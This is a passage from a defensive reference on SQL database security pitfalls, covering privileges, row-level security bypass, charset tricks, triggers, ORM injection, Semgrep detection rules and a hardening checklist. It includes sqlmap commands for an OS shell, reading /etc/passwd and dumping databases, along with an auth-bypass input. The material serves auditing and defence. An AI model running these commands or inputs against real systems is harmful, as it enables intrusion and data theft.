- MSSQL: SELECT / INSERT / UPDATE / DELETE / REFERENCES.
- Oracle: SELECT / INSERT / UPDATE / DELETE / REFERENCES / ALTER /
  INDEX.

Never grant `ALL`; enumerate. Future engine versions silently
expand `ALL`.

### 9.2 Role inheritance

- PostgreSQL: `INHERIT` (default) vs `NOINHERIT` (`SET ROLE` to
  activate).
- MySQL 8.0+: SQL-standard roles; activate via `SET ROLE` or
  `default_role`.
- MSSQL: immediate, no activation step.
- Oracle: `SET ROLE`; default roles activate at login.

Audit footgun: listing role memberships without checking which
are active. Cross-link [[reference-distributed-authz]] §"Static
vs dynamic authorization analysis."

### 9.3 `PUBLIC` default privileges

- PostgreSQL: `EXECUTE` on many built-ins; `CREATE`/`USAGE` on
  `public` schema.
- Oracle: `EXECUTE` on hundreds of packages historically including
  `UTL_FILE`, `UTL_HTTP`, `DBMS_LDAP`. Hardening guides spend most
  of their text on `REVOKE FROM PUBLIC`.
- MSSQL: `SELECT` on some system views; `guest` inherits from
  PUBLIC.

### 9.4 View security: DEFINER vs INVOKER

- PostgreSQL functions: `SECURITY DEFINER`. Views:
  `WITH (security_invoker = true)` since PG 15.
- MySQL: `SQL SECURITY DEFINER | INVOKER`. Default is DEFINER.
- MSSQL: `EXECUTE AS OWNER | CALLER | USER = '...'`.
- Oracle: `AUTHID DEFINER` (default) vs `AUTHID CURRENT_USER`.

A DEFINER view over a sensitive table grants every user the
underlying contents. Unqualified references inside trigger the
§2.7-class search-path-hijack.

### 9.5 RLS implementations differ

- **PostgreSQL**: `CREATE POLICY`; bypass = superuser / `BYPASSRLS`
  / table owner (unless `FORCE`).
- **MSSQL**: `CREATE SECURITY POLICY` filter + block predicates;
  bypass = `sysadmin` / `db_owner` / `IMPERSONATE`.
- **MySQL**: no native; views + `CURRENT_USER()`. Direct table
  access circumvents.
- **Oracle**: VPD via `DBMS_RLS.ADD_POLICY`; bypass =
  `EXEMPT ACCESS POLICY`.

Cross-dialect audit: for every RLS table, enumerate the bypass
set. PostgreSQL's owner-bypass-unless-FORCE is the canonical
footgun. Cross-link [[reference-distributed-authz]]
§"Tenant-isolation patterns."

### 9.6 Cross-link [[reference-distributed-authz]]

The authz-placement taxonomy (gateway-only / gateway+service /
data-layer-only / defense-in-depth) maps onto §9.5: RLS-enforced
data layer = data-layer-only, inheriting the failure modes in
`distributed_authz_expertise.md`.

---

## 10. Encoding and charset surprises

### 10.1 MySQL `utf8` is 3-byte only

Historical `utf8` is 3-byte UTF-8 — BMP only, truncates at non-BMP
(emoji, supplementary CJK). Use `utf8mb4` for full UTF-8.

Security: `'admin\xF0\x9F\x98\x82payload'` truncates to `'admin'`
after the 4-byte emoji on a `utf8` column — length-equality auth
bypass.

### 10.2 Pre-8.0 MySQL Latin-1 default

`latin1` maps high-bit bytes 1:1; UTF-8 data accumulates mojibake.
Verify charset at database / schema / table / column (all four
can differ).

### 10.3 `utf8_general_ci` vs `utf8mb4_unicode_ci`

`utf8_general_ci` treats many distinct codepoints as equal
(`'ä' = 'a'` is true). Homograph account collisions: legitimate
`admin` lookup returns attacker's `ädmin` row.

### 10.4 PostgreSQL encoding set at `initdb`

Immutable thereafter. Modern PG: UTF-8.

### 10.5 BOM in CSV imports

`COPY ... FROM '/path.csv' WITH (HEADER true)` does not strip the
UTF-8 BOM; it becomes part of the first column name. Preprocess
or use `FORMAT csv` with explicit column list.

---

## 11. Stored procedures and triggers

### 11.1 `BEFORE INSERT` mutation

`BEFORE INSERT` modifying `NEW.field` changes what's stored.
Developer's "INSERT these specific values" actually stores
trigger-mutated values; attacker INSERTs that match the trigger's
WHEN condition mutate application-presumed-immutable rows. PG /
MySQL / Oracle support BEFORE; MSSQL has only INSTEAD OF / AFTER.

### 11.2 INSTEAD OF triggers on views

Replace the underlying DML with arbitrary trigger body. View that
appears read-only (no table INSERT grant) silently accepts INSERTs
if `INSTEAD OF INSERT` exists.

### 11.3 MSSQL `BULK INSERT` skips AFTER triggers

`FIRE_TRIGGERS` option required. Audit triggers bypassed by
operator bulk loads — silent audit-log gaps.

### 11.4 MSSQL parameter sniffing

Plan cached on first-call parameter values. Subsequent calls with
different parameters get the wrong plan. Attacker who triggers
compilation with chosen params affects legitimate-call performance
— DoS side-channel.

### 11.5 Recursive triggers

- PostgreSQL: recurse to `max_stack_depth`.
- MySQL 8.0: bounded by `max_sp_recursion_depth`; 5.x no recursion.
- MSSQL: `nested triggers` / `recursive triggers` server options.
- Oracle: mutating-table restriction.

### 11.6 "Trigger silently breaks downstream auth"

Canonical class: app stores auth token; unrelated trigger
(audit/soft-delete/denorm) mutates the token row. Subsequent
auth-by-token check fails (DoS) or succeeds for the wrong user
(auth bypass). Audit every trigger on auth-relevant tables.

---

## 12. ORM-introduced footguns

Every ORM provides a raw-SQL escape hatch; every escape hatch is
the most common source of SQLi in modern applications.

### 12.1 ActiveRecord (Rails)

`Model.where("col = #{user}")` — injection. Safe: `where("col = ?",
user)` or `where(col: user)`. Brakeman flags every string
interpolation inside `where`, `order`, `group`, `joins`, `select`,
`find_by_sql`.

`annotate` / `optimizer_hints` / `query_log_tags` emit SQL
comments. CVE-2023-22794 (reported by Kurt Boberg) is annotation-
string interpolation that escapes the comment. Cross-link
[[reference-ruby-footguns]] §9.

### 12.2 Django

`Model.objects.raw('... WHERE col = %s' % user)` — injection. Safe:
`.raw('... = %s', [user])`. `extra(where=[...])` takes raw SQL.
`extra(select={'k': raw_sql})` is *not* parameterized.
`filter(field__startswith=user)` is parameterized. Cross-link
[[reference-python-footguns]] §10.

### 12.3 SQLAlchemy

`text("... id = " + str(uid))` — injection. Safe:
`text("... id = :id")` + bound parameters. F-string / `.format()` /
`+` defeats parameterization. Core API
(`select(users).where(users.c.id == uid)`) is parameterized.
Cross-link [[reference-python-footguns]] §10.

### 12.4 Hibernate / JPA

`createQuery("FROM User WHERE name = '" + user + "'")` — JPQL
injection. Safe: `setParameter`. `createNativeQuery` is the SQL
escape hatch with `text()`-class hazards. Cross-link
[[reference-java-footguns]] §JDBC and Hibernate.

### 12.5 Entity Framework

`ExecuteSqlRaw("... id = " + userId)` — injection. Safe:
`ExecuteSqlInterpolated($"... id = {userId}")` (EF parses the
interpolation for parameters) or `ExecuteSqlRaw("... id = {0}",
userId)`. LINQ-to-SQL parameterized; escape hatches: `FromSqlRaw`,
`ExecuteSqlRaw`. Cross-link [[reference-csharp-dotnet-footguns]].

### 12.6 mysqli / PDO

`mysqli_query($conn, $sql)` and `$pdo->query($sql)` accept raw
strings. Safe: `mysqli_prepare`+`bind_param`, `$pdo->prepare`+
`bindValue`. Legacy `mysql_*` removed. Cross-link
[[reference-php-footguns]] §mysqli/PDO.

### 12.7 The "99% protected, 1% raw" trap

Class lesson: ORMs raise the floor but not the ceiling.
Enumerate every `raw`, `text`, `execute`, `createNativeQuery`,
`FromSqlRaw`, `find_by_sql`, `annotate`, `extra`, equivalent —
verify each is parameterized. Detection at the call-site level
is the load-bearing intervention; framework-default review
produces false confidence.

### 12.8 Mass assignment

`Model.create(params)` with user-controlled hash assigns every
key to its column. User supplies `role: admin` → silent role
escalation. Defenses:

- ActiveRecord: `strong_parameters`.
- Django: Forms / DRF Serializers with explicit `fields`.
- SQLAlchemy: explicit `__init__` args; no `**kwargs` passthrough.
- Hibernate: explicit setters; avoid `BeanUtils.copyProperties`.
- Entity Framework: `[Bind]` or explicit DTO mapping.

Cross-link [[reference-ruby-footguns]] §"strong_parameters" + the
GitHub 2012 incident.

---

## 13. Detection patterns

Static-analysis rule sketches for the dialect-specific primitives.
Patterns are written in Semgrep `pattern:` syntax; load-bearing
generic version, refine per-language per call site.

### 13.1 PostgreSQL `COPY ... FROM PROGRAM`

```yaml
rules:
  - id: postgres-copy-from-program
    pattern-either:
      - pattern: |
          $CONN.execute("... COPY $X FROM PROGRAM ...")
      - pattern: |
          $CONN.exec("... COPY $X FROM PROGRAM ...")
      - pattern-regex: |
          COPY\s+\w+\s+(FROM|TO)\s+PROGRAM
    message: |
      `COPY ... FROM PROGRAM` is a remote-code-execution primitive in
      PostgreSQL. Verify the caller has a documented operational
      reason to grant `pg_execute_server_program` to this account.
    severity: HIGH
    languages: [python, ruby, java, generic]
```

### 13.2 MySQL `LOAD DATA LOCAL INFILE`

```yaml
rules:
  - id: mysql-load-data-local-infile-config
    pattern-either:
      - pattern: |
          mysql.connector.connect(..., allow_local_infile=True, ...)
      - pattern: |
          $URL = "...allowLoadLocalInfile=true..."
      - pattern-regex: |
          (?i)local[-_]infile[ \t]*[=:][ \t]*(1|true|on)
    message: |
      `LOAD DATA LOCAL INFILE` enables the rogue-server file-read
      attack: a malicious MySQL server can request any local file
      from the client. Disable unless explicitly required.
    severity: HIGH
    languages: [python, java, javascript, php, generic]
```

### 13.3 MSSQL `xp_cmdshell` / `sp_OACreate` invocation

```yaml
rules:
  - id: mssql-xp-cmdshell-call
    pattern-regex: |
      (?i)\b(EXEC|EXECUTE)\s+(\w+\.)?xp_cmdshell\b
    message: |
      `xp_cmdshell` shells out from the SQL Server process. Verify
      this is operationally required and that the SQL service
      account's OS privileges are minimal.
    severity: HIGH
    languages: [generic]
  - id: mssql-sp-oa-create
    pattern-regex: |
      (?i)\bsp_OACreate\b
    message: |
      `sp_OACreate` instantiates COM objects in the SQL Server
      process — equivalent to xp_cmdshell when chained with
      WScript.Shell.
    severity: HIGH
    languages: [generic]
```

### 13.4 SQLite `ATTACH DATABASE` / `load_extension`

```yaml
rules:
  - id: sqlite-attach-database-user-input
    pattern-either:
      - pattern: |
          $DB.execute(f"ATTACH DATABASE '{$X}' AS ...")
      - pattern: |
          $DB.execute("ATTACH DATABASE '" + $X + "' ...")
      - pattern: |
          $DB.execute(f"... load_extension({$X}) ...")
    message: |
      `ATTACH DATABASE` and `load_extension` are filesystem-access
      and shared-library-load primitives in SQLite. Never pass
      user input.
    severity: HIGH
    languages: [python, javascript, ruby]
```

### 13.5 Oracle `UTL_FILE`, `DBMS_JAVA`, `DBMS_SCHEDULER` job

```yaml
rules:
  - id: oracle-utl-file-user-input
    pattern-regex: |
      (?i)UTL_FILE\.(FOPEN|GET_LINE|PUT_LINE|PUT_RAW|FREMOVE|FRENAME)
    message: |
      `UTL_FILE` is a server-side file I/O primitive. Verify
      `EXECUTE ON UTL_FILE` is not granted to PUBLIC and that
      DIRECTORY objects are scoped.
    severity: MEDIUM
    languages: [generic]
  - id: oracle-dbms-scheduler-external-job
    pattern-regex: |
      (?i)DBMS_SCHEDULER\.CREATE_JOB\b[^;]*job_type\s*=>\s*'EXECUTABLE'
    message: |
      `DBMS_SCHEDULER` with `job_type => 'EXECUTABLE'` schedules
      external OS commands. Equivalent to xp_cmdshell.
    severity: HIGH
    languages: [generic]
```

### 13.6 ORM raw-SQL receivers

```yaml
rules:
  - id: activerecord-raw-where-interpolation
    pattern-either:
      - pattern: |
          $MODEL.where("...#{$X}...")
      - pattern: |
          $MODEL.find_by_sql("...#{$X}...")
      - pattern: |
          $MODEL.order("...#{$X}...")
    message: |
      String interpolation inside ActiveRecord query methods is
      SQL injection. Use placeholders: `where("col = ?", x)`.
    severity: HIGH
    languages: [ruby]
  - id: django-raw-sql-string-format
    pattern-either:
      - pattern: |
          $MODEL.objects.raw(f"... {$X} ...")
      - pattern: |
          $MODEL.objects.extra(where=[f"... {$X} ..."])
    message: |
      F-string / format inside Django raw / extra is SQL injection.
      Use positional parameters: `.raw("...", [x])`.
    severity: HIGH
    languages: [python]
  - id: sqlalchemy-text-string-build
    pattern-either:
      - pattern: |
          text(f"... {$X} ...")
      - pattern: |
          text("..." + $X + "...")
    message: |
      String-built `text()` defeats SQLAlchemy parameterization.
      Use bound parameters: `text("... :name").bindparams(name=x)`.
    severity: HIGH
    languages: [python]
```

### 13.7 sqlmap as offensive detection

sqlmap (https://sqlmap.org/) is the canonical offensive tool for
end-to-end SQLi detection + exploitation:

- `sqlmap -u <url> --batch` — automated detection
- `sqlmap -u <url> --os-shell` — escalate to OS command via the
  dialect-specific primitive
- `sqlmap -u <url> --file-read=/etc/passwd` — server-side file read
- `sqlmap -u <url> --dump-all` — full database dump

Operationally: include sqlmap in CI-integrated DAST against
non-production environments to catch SQLi that static analysis
misses (second-order, header-based, JSON-body injection points
that string-pattern rules under-cover). Cross-link
[[reference-cicd-supply-chain]] for the broader DAST-in-CI
discipline.

### 13.8 SQLFluff / pgFormatter / static analyzers

- **SQLFluff** (https://sqlfluff.com/) — SQL linter that catches
  some semantic anti-patterns (unused columns, wildcard SELECT,
  missing aliases). Useful for hygiene; not security-focused but
  improves auditability.
- **pgFormatter** — PostgreSQL-specific formatter.
- **Brakeman** — Rails-specific scanner with deep ActiveRecord
  SQLi coverage.
- **Bandit** — Python; covers SQLAlchemy `text()` and Django
  `raw`.
- **CodeQL** — has ORM-specific query packs for Rails / Django /
  Hibernate / Entity Framework.
- **rails_best_practices** — Rails-specific style + security
  linter.

Cross-link [[reference-semgrep-rule-authoring]] §"Rule authoring
discipline" for the workflow of moving from a sketch like 13.1
to a corpus-validated production rule.

---

## 14. Defensive checklist and variant analysis

### 14.1 Per-dialect hardening checklist (cross-cutting)

A 15-item checklist applicable to every dialect; each item is a
distinct grant or configuration variable that maps to one of the
primitive classes in §§2-6.

1. **No application account is ever a superuser / sysadmin / SYS /
   has `DBA` role.** This single rule eliminates the majority of
   §§2-6 primitives.
2. **Application accounts have only the table-level privileges
   they actually need.** SELECT / INSERT / UPDATE / DELETE on
   specific tables, never `GRANT ALL`, never PUBLIC defaults.
3. **`xp_cmdshell` disabled** in MSSQL (`sp_configure 'xp_cmdshell', 0`).
4. **`Ole Automation Procedures` disabled** in MSSQL.
5. **`Ad Hoc Distributed Queries` disabled** in MSSQL.
6. **`secure_file_priv` set to NULL** in MySQL where file I/O is
   not required.
7. **`LOCAL INFILE` disabled in client drivers**
   (`--local-infile=0`, `allowLoadLocalInfile=false`, etc.) for
   every MySQL connector.
8. **`pg_execute_server_program` granted to no application
   account** in PostgreSQL.
9. **`pg_read_server_files` / `pg_write_server_files` granted to
   no application account** in PostgreSQL.
10. **`load_extension` disabled** in SQLite-using applications
    unless explicitly required
    (`sqlite3_enable_load_extension(db, 0)`).
11. **`EXECUTE ON UTL_FILE` revoked from PUBLIC** in Oracle.
12. **`EXECUTE ON DBMS_LDAP` / `DBMS_XMLGEN` / `DBMS_JAVA` revoked
    from PUBLIC** in Oracle.
13. **All views and stored procedures audited** for `SECURITY
    DEFINER` / `DEFINER` / `AUTHID DEFINER` and explicit
    `search_path` / schema-qualification.
14. **RLS bypass set audited:** for every RLS-protected table,
    confirm `BYPASSRLS` is granted to no application account, the
    table owner is not the application account (or `FORCE ROW
    LEVEL SECURITY` is set), and no superuser-like role is used
    by the application.
15. **Trigger audit:** every trigger on auth-relevant tables is
    reviewed; no trigger silently modifies auth-relevant columns.

### 14.2 Variant analysis: cloud-managed databases

Cloud-managed databases (AWS RDS, GCP Cloud SQL, Azure SQL,
Azure Database for PostgreSQL/MySQL, AlloyDB, Aurora) ship with
different default configurations that subtly alter the dialect-
footgun catalog:

- **AWS RDS PostgreSQL** disables `pg_execute_server_program`
  outright; `COPY FROM PROGRAM` is not available. `CREATE
  EXTENSION` is restricted to a vendor-curated allowlist
  (`rds.extensions`). The `rds_superuser` role is the closest
  available proxy to superuser; it does not have unrestricted
  file access.
- **AWS RDS MSSQL** disables `xp_cmdshell`, OLE Automation,
  CLR-with-UNSAFE-PermissionSet. Linked servers are restricted.
- **GCP Cloud SQL PostgreSQL** similar to RDS — disabled
  `COPY FROM PROGRAM`, allowlisted extensions
  (`cloudsql.iam_authentication`, `pgaudit`, etc.). The
  `cloudsqlsuperuser` is a proxy superuser.
- **Azure SQL Database** disables CLR, xp_cmdshell, OLE
  Automation, linked servers (except Azure SQL Managed Instance).
  The `dbmanager` role is the proxy admin.
- **Azure Database for PostgreSQL** restricts `CREATE EXTENSION`
  to allowlist; `azure_pg_admin` is the proxy superuser.

The footgun across managed databases: an audit that assumes
"superuser = full RCE" understates the actual hardening of the
managed surface, but a *different* audit that assumes "managed
database is fully hardened" overstates it — managed defaults
still grant the proxy admin substantial capability, including
metadata service access (the IMDS SSRF chain still applies if
network ACLs permit), and the curated extension allowlist still
includes powerful entries (`pg_cron`, `pg_partman`, `plpython3u`
on some platforms).

The cross-link [[reference-cicd-supply-chain]] applies for the
secret-management discipline around managed-database
credentials: every managed DB credential is a long-lived secret
that requires cooldown / rotation discipline at the same level as
any production API key.

### 14.3 Variant analysis: vector databases

Vector databases (pgvector, Pinecone, Weaviate, Qdrant, Milvus,
Chroma) introduce different attack surfaces:

- **pgvector** runs inside PostgreSQL; inherits the entire §2
  catalog. Notably, the `vector` type does not require superuser
  to use (only to install via `CREATE EXTENSION` — see 2.3).
  Embedding-indexing queries (`SELECT ... ORDER BY embedding
  <-> query_vec LIMIT k`) are parameterized like any other SQL;
  the user-controlled input is the query vector, not arbitrary
  SQL. Injection of the query vector is bounded by the vector
  type's parser.
- **Pinecone / Weaviate / Qdrant** expose their own query
  languages (often JSON-shaped). Each has its own dialect-
  internal footgun catalog: Pinecone's metadata filter syntax,
  Weaviate's GraphQL surface, Qdrant's filter DSL. The bug
  classes are distinct from SQL but the audit posture is the
  same — enumerate the privileged primitives, restrict the
  application's access.
- **Chroma** (and Chroma-on-DuckDB / Chroma-on-SQLite) inherits
  the underlying engine's footgun catalog. Chroma-on-SQLite
  inherits §5's `ATTACH` / `load_extension` set.

Cross-link [[reference-code-review-expertise]] §"Click-count
severity": the increasing prevalence of vector DBs in AI
pipelines (RAG, agent memory, semantic search) means the
dialect-footgun audit catalog is expanding to cover engines whose
primitives are less well-understood than the relational set.

### 14.4 Final cross-link tour

This document is the SQL-dialect-internal companion to:

- `code_review_expertise.md` (the methodology — every primitive
  here is a candidate-point for the auditor).
- `python_footguns_expertise.md` §10 (Django + SQLAlchemy raw-SQL
  call sites).
- `ruby_footguns_expertise.md` §9 (ActiveRecord query interpolation).
- `java_footguns_expertise.md` (JDBC + Hibernate JPQL injection).
- `php_footguns_expertise.md` (mysqli + PDO escape hatches).
- `csharp_dotnet_footguns_expertise.md` (SqlClient + Entity Framework).
- `distributed_authz_expertise.md` (the RLS / multi-tenant story
  from §9).
- `cicd_supply_chain_expertise.md` (managed-database credential
  discipline, DAST-in-CI integration).
- [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) (the detection-rule authoring
  workflow that takes §13 sketches to production rules).
- `deserialization_expertise.md` (the `sp_OACreate` / `DBMS_JAVA` /
  CLR-assembly chains all reach deserialization primitives at
  the engine level).

The cross-dialect catalog grows over time; the audit posture is
stable. Enumerate every account; enumerate every grant; verify
every grant against the dialect-specific primitive catalog;
verify every ORM escape hatch is parameterized; verify every
trigger does not silently modify auth-relevant data.

---

## 15. References

PostgreSQL:

- PostgreSQL Security Information — https://www.postgresql.org/support/security/
- CVE-2024-7348 (pg_dump TOCTOU) — https://www.postgresql.org/support/security/CVE-2024-7348/
- CVE-2024-10977 (libpq MITM error retention) — https://www.postgresql.org/support/security/CVE-2024-10977/
- A Guide to CVE-2018-1058: Protect Your Search Path — https://wiki.postgresql.org/wiki/A_Guide_to_CVE-2018-1058:_Protect_Your_Search_Path
- PostgreSQL Documentation 5.9 Row Security Policies — https://www.postgresql.org/docs/current/ddl-rowsecurity.html
- PostgreSQL Documentation 21.6 Function Security — https://www.postgresql.org/docs/current/perm-functions.html
- "PostgreSQL COPY FROM PROGRAM is not a Vulnerability" (EDB blog) — https://www.enterprisedb.com/blog/postgresql-copy-program-not-vulnerability
- "Abusing SECURITY DEFINER functions in PostgreSQL" (Cybertec) — https://www.cybertec-postgresql.com/en/abusing-security-definer-functions/
- "PostgreSQL Penetration Testing" (HackingArticles) — https://www.hackingarticles.in/penetration-testing-on-postgresql-5432/
- "Postgres Row-Level Security Footguns" (Bytebase) — https://www.bytebase.com/blog/postgres-row-level-security-footguns/

MySQL / MariaDB:

- MySQL 8.0 Reference Manual: Security Considerations for LOAD DATA LOCAL — https://dev.mysql.com/doc/refman/8.0/en/load-data-local-security.html
- MySQL 8.0 Reference Manual: Comparison Functions and Operators — https://dev.mysql.com/doc/refman/8.0/en/comparison-operators.html
- "Abusing MySQL LOCAL INFILE to read client files" (w00tsec) — https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html
- "Percona Responds to MySQL LOCAL INFILE Security Issues" — https://www.percona.com/blog/2019/02/06/percona-responds-to-mysql-local-infile-security-issues/
- "3306 - Pentesting MySQL" (HackTricks) — https://hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html
- MySQL WL#13168: Client library safe LOAD DATA LOCAL INFILE paths/directories — https://dev.mysql.com/worklog/task/?id=13168

Microsoft SQL Server:

- Chris Anley, "Advanced SQL Injection in SQL Server Applications" (NGSSoftware, 2002) — https://cs155.stanford.edu/papers/sql_injection.pdf
- Chris Anley, "(more) Advanced SQL Injection" (NGSSoftware, 2002) — https://www.nccgroup.com/media/uxblt5wm/_advanced_sql_injection.pdf
- xp_cmdshell (Transact-SQL) — https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql
- Server Configuration: xp_cmdshell — https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option
- sp_OACreate (Transact-SQL) — https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-oacreate-transact-sql
- Server Configuration: OLE Automation Procedures — https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option
- OWASP WSTG Testing for SQL Server — https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server
- "SQL Server UNC Path Injection Cheat Sheet" (NetSPI PowerUpSQL) — https://github.com/NetSPI/PowerUpSQL/wiki/SQL-Server---UNC-Path-Injection-Cheat-Sheet
- Metasploit `mssql_ntlm_stealer` module — https://www.rapid7.com/db/modules/auxiliary/admin/mssql/mssql_ntlm_stealer/
- "Relaying NTLM to MSSQL" (Compass Security) — https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/
- "Compromising MSSQL Databases by Relaying" — https://lsecqt.github.io/Red-Teaming-Army/active-directory/compromising-mssql-databases-by-relaying/

SQLite:

- Run-Time Loadable Extensions — https://sqlite.org/loadext.html
- Load An Extension (`sqlite3_load_extension`) — https://sqlite.org/c3ref/load_extension.html
- Magellan SQLite RCE (Tencent Blade) — https://blade.tencent.com/magellan/index_en.html
- Magellan advisories — https://blade.tencent.com/en/advisories/sqlite/
- "SELECT code_execution FROM * USING SQLite" (Check Point Research, 2019) — https://research.checkpoint.com/2019/select-code_execution-from-using-sqlite/
- OpenRefine SQLite RCE advisory — https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-87cf-j763-vvh8
- osquery "SQLite ATTACH allows filesystem access" advisory — https://github.com/osquery/osquery/security/advisories/GHSA-4g56-2482-x7q8
- "SQLite Injection" (PayloadsAllTheThings) — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md
- "Exploiting the Magellan bug on 64-bit Chrome Desktop" (Exodus Intelligence) — https://blog.exodusintel.com/2019/01/22/exploiting-the-magellan-bug-on-64-bit-chrome-desktop/

Oracle:

- David Litchfield, "Lateral SQL Injection: A New Class of Vulnerability in Oracle" — http://www.davidlitchfield.com/lateral-sql-injection.pdf
- *The Oracle Hacker's Handbook* (Litchfield, 2007) — https://www.amazon.com/Oracle-Hackers-Handbook-Hacking-Defending/dp/0470080221
- *The Database Hacker's Handbook* (Litchfield, Anley, Heasman, Grindlay, 2005)
- Oracle UTL_FILE documentation — https://docs.oracle.com/cd/F49540_01/DOC/server.815/a68001/utl_file.htm
- "UTL_FILE_DIR Security Weakness" (Integrigy) — https://www.integrigy.com/oracle-security-blog/utlfiledir-security-weakness-why-and-how-use-oracle-directories
- Oracle External Procedures Documentation — https://docs.oracle.com/en/database/oracle/oracle-database/12.2/dfsig/external-procedures.html
- DBMS_CREDENTIAL for extproc — https://sbhoracle.wordpress.com/2016/03/29/db12c-feature-secure-external-procedures-with-dbms_credential/

sqlmap and Metasploit:

- sqlmap project — https://sqlmap.org/
- sqlmap GitHub — https://github.com/sqlmapproject/sqlmap
- sqlmap History — https://github.com/sqlmapproject/sqlmap/wiki/History
- Metasploit Framework — https://github.com/rapid7/metasploit-framework
- "A Brief History of Metasploit" — https://www.oreilly.com/library/view/metasploit/9781593272883/pr04s03.html
- Metasploit SQLi Libraries — https://docs.metasploit.com/api/Msf/Exploit/SQLi.html

ORMs and language-specific:

- "Python SQLAlchemy Raw Query SQL Injection Vulnerability" (Sourcery) — https://www.sourcery.ai/vulnerabilities/python-sqlalchemy-security-sqlalchemy-execute-raw-query
- "Do not use text() as it leads to SQL injection" (Datadog) — https://docs.datadoghq.com/security/code_security/static_analysis/static_analysis_rules/python-flask/disable-sqlalchemy-text/
- SQLAlchemy text-coercion deprecation issue #4481 — https://github.com/sqlalchemy/sqlalchemy/issues/4481
- "SQL Injection in the Age of ORM" (Afine) — https://afine.com/sql-injection-in-the-age-of-orm-risks-mitigations-and-best-practices

PortSwigger / Web Security Academy:

- PortSwigger Research — https://portswigger.net/research
- James Kettle portfolio — https://jameskettle.com/
- SQL injection learning path (Web Security Academy) — https://portswigger.net/web-security/learning-paths/sql-injection

OWASP and institutional:

- OWASP SQL Injection Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Web Security Testing Guide (WSTG) — https://owasp.org/www-project-web-security-testing-guide/
- CWE-89: Improper Neutralization of Special Elements in an SQL Command — https://cwe.mitre.org/data/definitions/89.html

Trail of Bits Testing Handbook (database chapters) — https://appsec.guide/
